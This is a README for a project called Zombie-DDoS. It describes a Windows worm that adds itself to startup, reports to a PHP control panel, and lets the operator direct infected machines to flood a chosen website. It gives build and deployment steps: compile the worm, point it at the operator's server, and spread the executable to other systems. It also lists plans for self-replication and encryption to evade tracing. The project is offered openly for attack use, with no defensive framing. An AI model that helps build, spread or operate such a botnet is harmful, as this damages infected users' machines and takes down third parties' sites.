# Zombie-DDoS
A toolkit to perform Distributed Denial of Service Attack using windows system, for which I designed a worm that embeds into windows startup upon it's first trigger. And then after will automatically start whenever the system is turned on.

## Installing and getting started
### Configure Server (Control Panel)
* It's really simple to start with, just go ahead and clone the repository on a windows machine.
* Now configure your PHP server from where you can keep an eye on systems that are infected by this Worm.
* Do copy all the php files in `server` directory to suitable hosted directory on your server.
### Building the worm
* Now run `zombie.cpp` in any suitable C++ compiler.
* Do remember to replace `SERVER_URL` macro definition with link of your server.
* This will register zombie executable file to startup folder making sure that program is triggered upon windows boot.
* This executable can be shared on different windows system and for all these notorious zombies, you have the control.
### Working with the control panel interface
![ezgif com-crop](https://user-images.githubusercontent.com/31488093/56852892-5e26ca00-693e-11e9-98f0-7d134506cd22.png)
* The interface is quite simple to use.
* Enter the site you want to attack and ping limit (iterations).
* Woohooo, all your zombies on windows system through out the world are doing nasty stuff for you.
* Soon, if number of live bots are enough, the site will go down.
### Example
* A sample version is hosted on [here](https://zombie-ddos.herokuapp.com)

## Future Ideas
* Further I want to make the worm more independent.
* It must have cloning and self replicating properties.
* Also encrypt it, making it very difficult to trace.
* And many more mischievous ideas.

## Contribution
* Please feel free to raise issues.
* Pull Requests are utmost welcomed.
